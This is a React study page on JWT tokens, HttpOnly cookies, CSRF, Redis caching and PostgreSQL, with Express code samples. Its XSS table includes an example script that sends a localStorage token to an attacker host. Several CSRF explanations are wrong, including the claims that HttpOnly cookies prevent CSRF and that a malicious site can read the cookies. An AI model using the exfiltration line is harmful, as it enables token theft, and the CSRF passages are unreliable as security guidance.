import React from "react";

import jwtImg from "../assets/jwt.jpeg";
import redisImg from "../assets/jwt_token_redis.jpeg";

function ImageBanner() {
  const images = [jwtImg, redisImg];

  return (
    <div
      style={{
        display: "grid",
        gridTemplateColumns: "repeat(auto-fit,minmax(300px,1fr))",
        gap: "20px",
        marginTop: "20px",
      }}
    >
      {images.map((img, index) => (
        <div
          key={index}
          style={{
            border: "1px solid #333",
            borderRadius: "12px",
            overflow: "hidden",
          }}
        >
          <img
            src={img}
            alt="jwt"
            style={{
              width: "100%",
              height: "auto",
              objectFit: "cover",
            }}
          />
        </div>
      ))}
    </div>
  );
}

const styles = {
  page: {
    padding: "30px",
    background: "#f3f4f6",
    fontFamily: "Arial",
    lineHeight: "1.7",
    textAlign: "left",
  },

  section: {
    background: "white",
    padding: "25px",
    borderRadius: "14px",
    marginBottom: "30px",
    boxShadow: "0 2px 10px rgba(0,0,0,0.08)",
  },

  title: {
    color: "#111827",
    marginBottom: "15px",
  },

  subTitle: {
    color: "#2563eb",
    marginBottom: "12px",
  },

  code: {
    background: "#111827",
    color: "#d1fae5",
    padding: "18px",
    borderRadius: "10px",
    overflowX: "auto",
    fontSize: "13px",
    marginTop: "15px",
    whiteSpace: "pre-wrap",
  },

  grid: {
    display: "grid",
    gridTemplateColumns: "repeat(auto-fit,minmax(450px,1fr))",
    gap: "20px",
  },
  
  th: {
    border: "1px solid #444",
    padding: "14px",
    textAlign: "left",
  },

  tdTitle: {
    border: "1px solid #444",
    padding: "14px",
    background: "#222",
    color: "#00ff90",
    fontWeight: "bold",
    verticalAlign: "top",
    minWidth: "220px",
  },

  td: {
    border: "1px solid #444",
    padding: "14px",
    background: "#1a1a1a",
    color: "#fff",
    verticalAlign: "top",
    lineHeight: "1.8",
  },
};

const JwtTokens = () => {
  return (
    <>
    <div style={styles.page}>
      <h3 style={styles.title}>
        🔐 JWT (Access Tokens + Refresh Tokens) + HTTPOnly Cookies (CSRF) + Redis (caching) + PostgreSQL(what is pool and how connect with pgsqlserver)
      </h3>
      <section
  style={{
    padding: "20px",
    textAlign: "left",
    fontFamily: "sans-serif",
  }}
>

  <h2
    style={{
      marginBottom: "20px",
    }}
  >
    localStorage vs sessionStorage vs Cookies vs HttpOnly Cookies
  </h2>

  <div
    style={{
      overflowX: "auto",
    }}
  >

    <table
      style={{
        width: "100%",
        borderCollapse: "collapse",
        minWidth: "1700px",
      }}
    >

      <thead>

        <tr
          style={{
            background: "#111",
            color: "#00ff90",
          }}
        >
          <th style={styles.th}>Feature</th>
          <th style={styles.th}>localStorage</th>
          <th style={styles.th}>sessionStorage</th>
          <th style={styles.th}>Cookies</th>
          <th style={styles.th}>HttpOnly Cookies</th>
        </tr>

      </thead>

      <tbody>

        <tr>
          <td style={styles.tdTitle}>Where Stored</td>

          <td style={styles.td}>
            Browser Storage
          </td>

          <td style={styles.td}>
            Browser Tab Storage
          </td>

          <td style={styles.td}>
            Browser Cookie Storage
          </td>

          <td style={styles.td}>
            Browser Cookie Storage
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Accessible By JavaScript</td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            localStorage.getItem()
          </td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            sessionStorage.getItem()
          </td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            document.cookie
          </td>

          <td style={styles.td}>
            ✘ No
            <br />
            Browser blocks JS access
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Auto Sent To Backend</td>

          <td style={styles.td}>
            ✘ No
            <br />
            Must manually send in headers
          </td>

          <td style={styles.td}>
            ✘ No
            <br />
            Must manually send in headers
          </td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            Sent with every request
          </td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            Sent automatically by browser
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Survives Refresh</td>

          <td style={styles.td}>
            ✔ Yes
          </td>

          <td style={styles.td}>
            ✔ Yes
          </td>

          <td style={styles.td}>
            ✔ Yes
          </td>

          <td style={styles.td}>
            ✔ Yes
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Survives Browser Close</td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            Until manually cleared
          </td>

          <td style={styles.td}>
            ✘ No
            <br />
            Removed when tab closes
          </td>

          <td style={styles.td}>
            Depends on expiry
          </td>

          <td style={styles.td}>
            Depends on expiry
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Can Frontend Read JWT?</td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            Easy access using JS
          </td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            Easy access using JS
          </td>

          <td style={styles.td}>
            ✔ Yes
            <br />
            document.cookie
          </td>

          <td style={styles.td}>
            ✘ No
            <br />
            Frontend cannot read token
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>XSS Attack Risk</td>

          <td style={styles.td}>
            ⚠ HIGH
            <br />
            Malicious JS can steal token
            <br /><br />

            Example:
            <br />

{`<script>
fetch("https://hack.com?token=" +localStorage.getItem("token"))
</script>`}
          </td>

          <td style={styles.td}>
            ⚠ HIGH
            <br />
            Same as localStorage
          </td>

          <td style={styles.td}>
            ⚠ MEDIUM
            <br />
            JS can still read cookie
            using document.cookie
          </td>

          <td style={styles.td}>
            ✔ LOW
            <br />
            JS cannot access token
            <br /><br />

            HttpOnly blocks:
            <br />
            document.cookie
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>CSRF Attack Risk</td>

          <td style={styles.td}>
            ✔ LOW
            <br />
            Browser does not auto-send token
          </td>

          <td style={styles.td}>
            ✔ LOW
          </td>

          <td style={styles.td}>
            ⚠ HIGH
            <br />
            Browser auto-sends cookie
          </td>

          <td style={styles.td}>
            ⚠ HIGH
            <br />
            Browser auto-sends cookie
            <br /><br />

            Protected using:
            <br />
            SameSite
            <br />
            CSRF Token
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Removed / Cleared</td>

          <td style={styles.td}>
{`localStorage.clear()
localStorage.removeItem("token")`}
          </td>

          <td style={styles.td}>
{`sessionStorage.clear()
sessionStorage.removeItem("token")`}
          </td>

          <td style={styles.td}>
{`document.cookie =
"token=; expires=Thu,
01 Jan 1970 00:00:00 UTC;"`}
          </td>

          <td style={styles.td}>
            Cannot remove directly from JS
<br/>
            Backend must send:
<br/>
{`Set-Cookie: token=;
HttpOnly; Expires=PastDate`}
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Storage Size</td>

          <td style={styles.td}>
            ~5MB
          </td>

          <td style={styles.td}>
            ~5MB
          </td>

          <td style={styles.td}>
            ~4KB
          </td>

          <td style={styles.td}>
            ~4KB
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Persistence</td>

          <td style={styles.td}>
            Long term
          </td>

          <td style={styles.td}>
            Per tab session
          </td>

          <td style={styles.td}>
            Based on expiry
          </td>

          <td style={styles.td}>
            Based on expiry
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Best Use</td>

          <td style={styles.td}>
            Theme
            <br />
            UI Preferences
            <br />
            Non-sensitive data
          </td>

          <td style={styles.td}>
            Temporary form data
            <br />
            Per-tab state
          </td>

          <td style={styles.td}>
            Small backend-readable data
          </td>

          <td style={styles.td}>
            Authentication
            <br />
            Refresh Tokens
            <br />
            Secure Sessions
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>JWT Access Token</td>

          <td style={styles.td}>
            ⚠ Possible
            <br />
            But vulnerable to XSS
          </td>

          <td style={styles.td}>
            ⚠ Possible
          </td>

          <td style={styles.td}>
            ✔ Better
          </td>

          <td style={styles.td}>
            ✔ Recommended
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Refresh Token</td>

          <td style={styles.td}>
            ✘ Dangerous
          </td>

          <td style={styles.td}>
            ✘ Dangerous
          </td>

          <td style={styles.td}>
            ⚠ Okay
          </td>

          <td style={styles.td}>
            ✔ BEST CHOICE
          </td>
        </tr>

        <tr>
          <td style={styles.tdTitle}>Most Secure Setup</td>

          <td style={styles.td}>
            ✘ Not Recommended
          </td>

          <td style={styles.td}>
            ✘ Not Recommended
          </td>

          <td style={styles.td}>
            ✔ Better
          </td>

          <td style={styles.td}>
            ✔ Access Token:
            Memory
            <br /><br />

            ✔ Refresh Token:
            HttpOnly Cookie
          </td>
        </tr>

      </tbody>

    </table>

  </div>

</section>
<section
  style={{
    padding: "20px",
    fontFamily: "sans-serif",
    textAlign: "left",
  }}
>
<h2>How JWT directly managed by browser dealing with authentication of the user </h2>
<div
  style={{
    display: "grid",
    gridTemplateColumns: "1fr 1fr 1fr",
    gap: "16px",
  }}
>

{/* ====================================== */}
{/* DEMO */}
{/* ====================================== */}
<div
  style={{
    background: "#111",
    color: "#00ff90",
    padding: "16px",
    borderRadius: "10px",
  }}
>

<h2>Demo</h2>

<pre
  style={{
    whiteSpace: "pre-wrap",
    lineHeight: "1.6",
    fontSize: "13px",
  }}
>
{`Note:- After login user assign jwt token so when user does any get,post, put, delete the backend need to verify the token before implementing it to DB.

LOGIN RESPONSE
---------------
Set-Cookie:
token=jwt123
HttpOnly

================================

FRONTEND REQUEST
----------------

fetch("/posts", {
  method: "POST",
  credentials: "include"
})

================================
ACTUAL REQUEST
---------------
POST /posts
Cookie: token=jwt123

================================

BACKEND
--------
const token = req.cookies.token

jwt.verify(token, SECRET)

================================

IMPORTANT
----------
✔ JS cannot READ token

✘ document.cookie blocked

✔ Browser CAN STILL attach cookie


// HTTPOnly Cookies
res.cookie("accessToken",accessToken,
  {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
  }
);
res.cookie("refreshToken",refreshToken,
  {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
  }
);
res.json({success: true, message:"Login success",});`}
</pre>

</div>

{/* ====================================== */}
{/* EXPLANATION */}
{/* ====================================== */}

<div
  style={{
    background: "#111",
    color: "#00ff90",
    padding: "16px",
    borderRadius: "10px",
  }}
>

<h2>Explanation</h2>

<pre
  style={{
    whiteSpace: "pre-wrap",
    lineHeight: "1.6",
    fontSize: "13px",
  }}
>
{`
CONFUSION
----------
"If JS blocked, how request gets token?"

================================

ANSWER
-------
Browser itself manages cookies

Frontend JS and Browser are different things

================================

JS
---
✘ Cannot read cookie

Browser
---------
✔ Can store cookie
✔ Can attach cookie
✔ Can send cookie

================================

FLOW : js can't read but browser can read httponly cookies and attaches if same-site=true condition set at declaring cookie in backend
-----

1. Backend sets cookie
2. Browser stores it
3. User sends request
4. Browser auto-adds:
Cookie: token=xyz
5. Backend verifies JWT

================================

IMPORTANT
----------
Frontend never manually attaches token

Browser automatically handles cookie internally

--> HTTP only cookies can't be read by frontend prevent csrf attack, can't be read by frontend using document.cookie but can be managed by browser neatly`}
</pre>

</div>

{/* ====================================== */}
{/* TRAPS */}
{/* ====================================== */}

<div
  style={{
    background: "#111",
    color: "#00ff90",
    padding: "16px",
    borderRadius: "10px",
  }}
>

<h2>Traps / Security</h2>

<pre
  style={{
    whiteSpace: "pre-wrap",
    lineHeight: "1.6",
    fontSize: "13px",
  }}
>
{`XSS ATTACK
-----------
<script>
 localStorage.getItem("token")
</script>
✔ localStorage vulnerable
================================

HttpOnly
----------
<script>
 document.cookie
</script>
✘ Blocked

================================
CSRF ISSUE
------------

Browser auto-sends cookie
So malicious site may trigger authenticated request

================================

FIX
----
✔ SameSite=Strict
✔ CSRF Token
✔ Secure=true

================================

BEST PRACTICE
--------------
Access Token
-------------
✔ Memory

Refresh Token
--------------
✔ HttpOnly Cookie


--> CSRF- Cross Site Resource Forgery-- logged user of one website 
          opens malicious website in other tab then the website also can 
          access and read the cookies and pretend login as you. So preveht it by HTTP only cookies`}
</pre>

</div>

</div>

</section>
      {/* ================================================= */}
      {/* FLOW */}
      {/* ================================================= */}

<div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)'}}>
        <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🚀 Authentication Flow
        </h2>

        <pre style={styles.code}>
{`JWT- JSON Web Tokens used to authenticate user transmits the information with signing keys

User Login
   ↓
Frontend sends email/password
   ↓
Backend verifies user
   ↓
bcrypt.compare(password)
   ↓
JWT Access Token Created
   ↓
Refresh Token Created
   ↓
Refresh Token stored in DB
   ↓
Tokens sent as HTTPOnly Cookies
   ↓
Frontend sends cookies automatically
   ↓
Backend verifies JWT
   ↓
Protected Route Access
`}
        </pre>
      </section>
<section style ={styles.section}>
  <pre style={styles.code}>
  {`// ============================================
// Redis Cache Connection
// ============================================
 Redis is an in-memory data store used for CACHING.

 WHY USE REDIS?
 - Database queries are slow (disk I/O)
 - Redis stores data in RAM = super fast reads
 - We cache frequently accessed data (like product lists)
 - When data changes, we INVALIDATE (delete) the cache
   so next request fetches fresh data from DB

 FLOW:
 1. Request comes in for products
 2. Check Redis: "Do we have cached products?"
    - YES → Return cached data (fast!)
    - NO  → Query PostgreSQL, store result in Redis, return data
 3. When products are added/updated/deleted → delete cache
    so next request gets fresh data
 ============================================
const Redis = require("ioredis");
require("dotenv").config();

// ============================================
// Create Redis Client
// ============================================
// We use lazyConnect so app does not crash
// if Redis server is temporarily unavailable
// ============================================

const redis = new Redis({
  host: process.env.REDIS_HOST || "127.0.0.1",
  port: Number(process.env.REDIS_PORT) || 6379,
  password: process.env.REDIS_PASSWORD || undefined,

  maxRetriesPerRequest: 3,
  enableReadyCheck: true,
  lazyConnect: true,

  retryStrategy: (times) => {
    if (times > 3) {
      console.log("❌ Redis connection failed after 3 retries");
      return null; // stop retrying
    }

    const delay = Math.min(times * 200, 2000);

    console.log(\`🔄 Retrying Redis connection in \${delay}ms\`);

    return delay;
  },
});

// ============================================
// Redis Events
// ============================================

redis.on("connect", () => {
  console.log("✅ Connected to Redis cache");
});

redis.on("ready", () => {
  console.log("🚀 Redis is ready to accept commands");
});

redis.on("error", (err) => {
  console.error("⚠️ Redis error (app will work without cache):",err.message);
});

redis.on("close", () => {
  console.log("🔌 Redis connection closed");
});

redis.on("reconnecting", () => {
  console.log("🔄 Reconnecting to Redis...");
});

// ============================================
// OPTIONAL: Manual Redis Connection
// ============================================
// Call this during server startup
// ============================================

const connectRedis = async () => {
  try {
    if (redis.status !== "ready") {
      await redis.connect();
    }
  } catch (err) {
    console.error("❌ Failed to connect Redis:", err.message);
  }
};

// ============================================
// HELPER: Get cached data
// ============================================
// key = a string like "products:all"
//
// Returns:
// - Parsed JSON data if cache exists
// - null if cache does not exist
// ============================================

const getCache = async (key) => {
  try {
    const data = await redis.get(key);

    if (data) {
      console.log(\`📦 Cache HIT for key: \${key}\`);
      return JSON.parse(data);
    }

    console.log(\`🔍 Cache MISS for key: \${key}\`);

    return null;
  } catch (err) {
    console.error("❌ Redis getCache error:", err.message);
    return null;
  }
};

// ============================================
// HELPER: Set cache with TTL
// ============================================
// key   = cache key
// data  = JS object/array
// ttl   = expiration time in seconds
//
// EX = expire after X seconds
// ============================================

const setCache = async (key, data, ttl) => {
  try {
    const expiry = ttl || Number(process.env.REDIS_CACHE_TTL) || 300;

    await redis.set(
      key,
      JSON.stringify(data),
      "EX",
      expiry
    );

    console.log(\`💾 Cache SET for key: \${key} (TTL: \${expiry}s)\`);
  } catch (err) {
    console.error("❌ Redis setCache error:", err.message);
  }
};

// ============================================
// HELPER: Delete single cache key
// ============================================
const deleteCache = async (key) => {
  try {
    await redis.del(key);
    console.log(\`🗑️ Cache DELETED for key: \${key}\`);
  } catch (err) {
    console.error("❌ Redis deleteCache error:", err.message);
  }
};
const deleteCachePattern = async (pattern) => {
  try {
    const keys = await redis.keys(pattern);
    if (keys.length > 0) {
      await redis.del(...keys);
      console.log(\`🗑️ Cache DELETED \${keys.length} keys matching: \${pattern}\`);
    } else {
      console.log(\`ℹ️ No cache keys found for pattern: \${pattern}\`);
    }
  } catch (err) {
    console.error("❌ Redis deleteCachePattern error:",err.message);
  }
}`}</pre>
</section>
</div>
      {/* ================================================= */}
      {/* INSTALL */}
      {/* ================================================= */}

<div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)'}}>
        <section style={styles.section}>
        <h2 style={styles.subTitle}>
          📦 Backend Packages
        </h2>

        <pre style={styles.code}>
{`
npm install express cors dotenv
npm install jsonwebtoken bcryptjs
npm install cookie-parser
npm install pg ioredis
`}
        </pre>
      </section>

      {/* ================================================= */}
      {/* ENV */}
      {/* ================================================= */}

      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          ⚙️ .env
        </h2>

        <pre style={styles.code}>
{`
PORT=5000

DB_HOST=localhost
DB_PORT=5432
DB_USER=postgres
DB_PASSWORD=postgres
DB_NAME=jwt_demo

JWT_SECRET=mysecretkey
JWT_REFRESH_SECRET=myrefreshsecret

REDIS_HOST=127.0.0.1
REDIS_PORT=6379
`}
        </pre>
      </section>
</div>

      {/* ================================================= */}
      {/* POSTGRES */}
      {/* ================================================= */}

<div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr'}}>
        <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🐘 PostgreSQL Pool
        </h2>

        <pre style={styles.code}>
{`
import pg from "pg";

const { Pool } = pg;

export const pool = new Pool({
  host: process.env.DB_HOST,
  port: process.env.DB_PORT,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
});
`}
        </pre>
      </section>

      {/* ================================================= */}
      {/* REDIS */}
      {/* ================================================= */}

      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          ⚡ Redis Cache
        </h2>

        <pre style={styles.code}>
{`
import Redis from "ioredis";

export const redis = new Redis({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
});

export const getCache = async (key) => {
  const data = await redis.get(key);
  return data ? JSON.parse(data): null;
};

export const setCache = async (key, data) => {
  await redis.set(key, JSON.stringify(data), "EX",300);
};
`}
        </pre>
      </section>
</div>

      {/* ================================================= */}
      {/* JWT */}
      {/* ================================================= */}

<div style={{display:'grid', gridTemplateColumns:"repeat(2,1fr)"}}>
      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🔐 JWT Token Functions
        </h2>

        <pre style={styles.code}>
{`
import jwt from "jsonwebtoken";

export const generateAccessToken = (user) => {
  return jwt.sign(
    {id: user.id,role: user.role,}, 
    process.env.JWT_SECRET,
    {expiresIn: "15m",}
  );
};

export const generateRefreshToken =(user) => {
  return jwt.sign(
    {id: user.id,},
    process.env.JWT_REFRESH_SECRET,
    {expiresIn: "7d",}
  );
};
`}
        </pre>
      </section>

      {/* ================================================= */}
      {/* LOGIN */}
      {/* ================================================= */}

      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🔑 Login Route
        </h2>

        <pre style={styles.code}>
{`app.post("/login", async (req, res) => {
    const {email,password,} = req.body;
    const result = await pool.query("SELECT * FROM users WHERE email=$1", [email]);
    const user = result.rows[0];
    if (!user) {
      return res.json({success: false,});
    }

    const valid = await bcrypt.compare(password,user.password);

    if (!valid) {
      return res.json({
        success: false,
      });
    }
    const accessToken = generateAccessToken(user);

    const refreshToken =generateRefreshToken(user);

    // store refresh token
    await pool.query(
    \`INSERT INTO refresh_tokens(user_id,token) VALUES($1,$2)\`,
      [user.id,refreshToken,]
    );

    // HTTPOnly Cookies
    res.cookie("accessToken",accessToken,
      {
        httpOnly: true,
        secure: true,
        sameSite: "strict",
      }
    );
--> HTTP only cookies can't be read by frontend prevent csrf attack
--> CSRF- Cross Site Resource Forgery-- logged user of one website 
          opens malicious website in other tab then the website also can 
          access and read the cookies and pretend login as you. So preveht it by HTTP only cookies

    res.cookie("refreshToken",refreshToken,
      {
        httpOnly: true,
        secure: true,
        sameSite: "strict",
      }
    );
    res.json({
      success: true,
      message:"Login success",
    });
  }
);
`}
        </pre>
      </section>
</div>

      {/* ================================================= */}
      {/* VERIFY TOKEN */}
      {/* ================================================= */}

<div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)'}}>
        <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🛡️ Verify JWT Middleware
        </h2>

        <pre style={styles.code}>
{`
export const authenticate = (req, res, next) => {
  const token =req.cookies.accessToken;
  if (!token) {
    return res.status(401).json({message: "Token missing",});
  }
  try {
    const decoded =jwt.verify(token,process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch {
    return res.status(401).json({
      message:"Invalid token",
    });
  }
};
`}
        </pre>
      </section>

      {/* ================================================= */}
      {/* PROTECTED */}
      {/* ================================================= */}

      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🔒 Protected Route
        </h2>

        <pre style={styles.code}>
{`
app.get("/profile", authenticate, async (req, res) => {
    const result = await pool.query(
        "SELECT * FROM users WHERE id=$1",
        [req.user.id]
      );
    return res.json(result.rows[0]);
  }
);
`}
        </pre>
      </section>
</div>

      {/* ================================================= */}
      {/* FRONTEND LOGIN */}
      {/* ================================================= */}
<div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)'}}>
  
      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          ⚛️ React Login Request
        </h2>

        <pre style={styles.code}>
{`
const loginUser = async () => {
const response =
  await fetch("http://localhost:5000/login",
    {
      method: "POST",
      headers: {"Content-Type":"application/json",},
      credentials: "include",
      body: JSON.stringify({
        email:"admin@gmail.com",
        password:"123456",
      }),
    }
  );

  const data = await response.json();
  console.log(data);
};
`}
        </pre>
      </section>

      {/* ================================================= */}
      {/* FRONTEND GET */}
      {/* ================================================= */}

      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          📥 Protected GET Request
        </h2>

        <pre style={styles.code}>
{`
const getProfile = async () => {
  const response =await fetch("http://localhost:5000/profile",
      {
        method: "GET",
        credentials: "include",
      }
    );
  const data = await response.json();
  console.log(data);
};
`}
        </pre>
      </section>
</div>

      {/* ================================================= */}
      {/* CORS */}
      {/* ================================================= */}
<div style={{display:'grid', gridTemplateColumns:'repeat(2,1fr)'}}>
  
      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🌍 CORS Setup
        </h2>

        <pre style={styles.code}>
{`
import cors from "cors";

app.use(cors({ 
    origin:"http://localhost:5173", --frontend url
    credentials: true,
  })
);
`}
        </pre>
      </section>

      {/* ================================================= */}
      {/* SECURITY */}
      {/* ================================================= */}

      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🛡️ Security Best Practices
        </h2>

        <pre style={styles.code}>
{`
✅ Use HTTPOnly cookies
   - JS cannot access cookies

✅ Use secure:true
   - HTTPS only

✅ Use sameSite:"strict"
   - Prevents CSRF

✅ Access token short expiry
   - 15 minutes

✅ Refresh token long expiry --store them in DB
   - 7 days

✅ Store refresh token in DB

✅ Hash passwords using bcrypt

✅ Never store passwords directly

✅ Use Redis cache
   - Faster product fetch

✅ Clear Redis cache after update/delete
`}
        </pre>
      </section>
</div>
<div
  style={{
    display: "grid",
    gridTemplateColumns: "repeat(2,1fr)",
    gap: "20px",
    marginTop: "30px",
  }}
>

  {/* =====================================================
      LEFT SIDE
  ===================================================== */}

  <section style={styles.section}>

    <h2 style={styles.subTitle}>
      ⚡ Backend Redis Cache API Flow
    </h2>

    <pre style={styles.code}>
{`
Client Request
      ↓
GET /products
      ↓
Check Redis Cache

redis.get("products")

      ↓

Cache HIT ?
   YES
      ↓
Return Cached Data

   NO
      ↓
Fetch From PostgreSQL
      ↓
Store Data In Redis
      ↓
Return Response



WHY CACHE?

PostgreSQL
   ↓
Disk Read
   ↓
Slower

Redis
   ↓
RAM Memory
   ↓
Super Fast



CACHE INVALIDATION

CREATE PRODUCT
UPDATE PRODUCT
DELETE PRODUCT

      ↓

Delete Old Cache

redis.del("products")

      ↓

Next API Call
Gets Fresh Data
`}
    </pre>

  </section>



  {/* =====================================================
      RIGHT SIDE
  ===================================================== */}

  <section style={styles.section}>

    <h2 style={styles.subTitle}>
      🧠 Express + Redis Cache API
    </h2>

    <pre style={styles.code}>
{`
app.get("/products", async (req, res) => {

    try {
      const cachedProducts = await redis.get("products");

      // =====================================
      // CACHE HIT
      // =====================================

      if (cachedProducts) {
        console.log( "⚡ Data from Redis Cache");
        return res.json(JSON.parse(cachedProducts));
      }

      // =====================================
      // CACHE MISS
      // =====================================
      console.log("🐘 Data from PostgreSQL");

      const result = await pool.query("SELECT * FROM products");


      // =====================================
      // STORE IN REDIS
      // EX = Expire Time
      // 300 seconds = 5 mins
      // =====================================

      await redis.set("products",
        JSON.stringify(result.rows),
        "EX",
        300
      );

      // =====================================
      // SEND RESPONSE
      // =====================================

      return res.json(result.rows);
    } catch (err) {
      console.log(err);
      return res.status(500).json({message: "Server Error"});
    }
  }
);`}
    </pre>
  </section>
</div>

<div
  style={{
    display: "grid",
    gridTemplateColumns: "repeat(2,1fr)",
    gap: "20px",
    marginTop: "30px",
  }}
>

  {/* =====================================================
      LEFT SIDE
  ===================================================== */}

  <section style={styles.section}>

    <h2 style={styles.subTitle}>
      ⚡ Redis Cache Keys Explained
    </h2>

    <pre style={styles.code}>
{`
REDIS STORES DATA
IN KEY → VALUE FORMAT



EXAMPLES

"products"
      ↓
All Products List



"product:1"
      ↓
Single Product With ID 1



"product:25"
      ↓
Single Product With ID 25



"user:10"
      ↓
Single User Data



=====================================

WHY "products" KEY?

await redis.set(
  "products",
  JSON.stringify(data)
)

This means:

KEY   = "products"

VALUE = all products array



=====================================

WHERE DOES CACHE STORE?

Inside Redis RAM Memory

NOT PostgreSQL



=====================================

FLOW

Client Request
      ↓
GET /products
      ↓
redis.get("products")

If exists
   ↓
Return cached products

If not exists
   ↓
Fetch PostgreSQL data
   ↓
redis.set("products",data)
   ↓
Save into Redis memory
   ↓
Return response



=====================================

CACHE EXPIRE

"EX", 300

Means:

Delete cache after 300 seconds
(5 minutes)



=====================================

CACHE INVALIDATION

CREATE PRODUCT
UPDATE PRODUCT
DELETE PRODUCT

      ↓

redis.del("products")

Old cache removed

Next request gets fresh DB data
`}
    </pre>

  </section>



  {/* =====================================================
      RIGHT SIDE
  ===================================================== */}

  <section style={styles.section}>

    <h2 style={styles.subTitle}>
      🧠 Cache All Products + Single Product
    </h2>

    <pre style={styles.code}>
{`// ============================================
// GET ALL PRODUCTS
// CACHE KEY = "products"
// ============================================
app.get( "/products", async (req, res) => {
    // CHECK CACHE
    const cachedProducts = await redis.get("products");

    // CACHE HIT

    if (cachedProducts) {
      console.log("⚡ Products From Cache");
      return res.json(JSON.parse(cachedProducts));
    }

    // CACHE MISS

    const result = await pool.query("SELECT * FROM products");

    // STORE CACHE
    await redis.set(
      "products",
      JSON.stringify(result.rows),
      "EX",
      300
    );
    return res.json(result.rows);
  }
);

// ============================================
// GET SINGLE PRODUCT
// CACHE KEY = product:id
// EXAMPLE = product:5
// ============================================

app.get("/products/:id", async (req, res) => {
    const { id } = req.params;

    //dynamic cache key
    const cacheKey = \`product:\${id}\`;

    const cachedProduct = await redis.get(cacheKey);

    // CACHE HIT
    if (cachedProduct) {
      console.log("⚡ Single Product From Cache");
      return res.json(JSON.parse(cachedProduct));
    }

    // CACHE MISS

    const result = await pool.query("SELECT * FROM products WHERE id=$1",[id]);

    const product = result.rows[0];
    // STORE SINGLE PRODUCT

    await redis.set(
      cacheKey,
      JSON.stringify(product),
      "EX",
      300
    );
    return res.json(product);

  }
);

// ============================================
// UPDATE PRODUCT
// CLEAR OLD CACHE
// ============================================
app.put("/products/:id" ,async (req, res) => {
    const { id } = req.params;
    // UPDATE DATABASE

    await pool.query("UPDATE products SET name=$1 WHERE id=$2", ["Iphone", id]);

    // DELETE CACHE

    await redis.del("products");

    await redis.del(\`product:\${id}\`);

    return res.json({success: true,});
  }
);
`}
    </pre>

  </section>

</div>


      {/* ================================================= */}
      {/* REDIS FLOW */}
      {/* ================================================= */}
<div style={{display:'grid', gridTemplateColumns:'repeat(2, 1fr)'}}>
  
      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          ⚡ Redis Cache Flow
        </h2>

        <pre style={styles.code}>
{`
Frontend Request
      ↓
Check Redis Cache
      ↓
Cache HIT ?
   YES → Return Cached Data
   NO
      ↓
Query PostgreSQL
      ↓
Store Result in Redis
      ↓
Return Response
`}
        </pre>
      </section>

      {/* ================================================= */}
      {/* LOGOUT */}
      {/* ================================================= */}

      <section style={styles.section}>
        <h2 style={styles.subTitle}>
          🚪 Logout
        </h2>

        <pre style={styles.code}>
{`-- clear httpOnlyCookies

app.post("/logout", async (req, res) => {

    res.clearCookie("accessToken");
    res.clearCookie("refreshToken");

    res.json({success: true,});
  }
);
`}
        </pre>
      </section>
</div>
<div style={{display:'grid', gridTemplateColumns:'repeat(2, 1fr)'}}>
<div
  style={{
    background: "#111",
    color: "#00ff90",
    padding: "16px",
    borderRadius: "10px",
  }}
>

<h2>JWT Security & Interview Traps</h2>

<pre
  style={{
    whiteSpace: "pre-wrap",
    lineHeight: "1.6",
    fontSize: "13px",
  }}
>
{`
====================================================
JWT SECURITY FLOW
====================================================
when user logouts and still attacker has token he could login as you?
solution: when user logout the access token has short span, but cancel it and token blacklist the refresh token

Login
  ↓
Verify Credentials
  ↓
Generate Access Token
  ↓
Generate Refresh Token
  ↓
Store In HttpOnly Cookies
  ↓
Return Success

====================================================
ACCESS TOKEN
----------------------------------------------------
Purpose:
Used For API Requests

Expiry:
5 min - 15 min

Example:

jwt.sign( {userId:1, role:"admin"}, SECRET, {expiresIn:"15m"})

====================================================
REFRESH TOKEN
----------------------------------------------------
Purpose: Generate New Access Token store it in DB and send post access token expiry rotate this token
Expiry:
7 Days / 30 Days

Example:
jwt.sign({userId:1}, REFRESH_SECRET, {expiresIn:"7d"})

====================================================
BEST PRACTICE
----------------------------------------------------
Access Token
 ↓
Short Lifetime

Refresh Token
 ↓
Long Lifetime

If Access Token Expires
 ↓
Use Refresh Token
 ↓
Issue New Access Token
====================================================
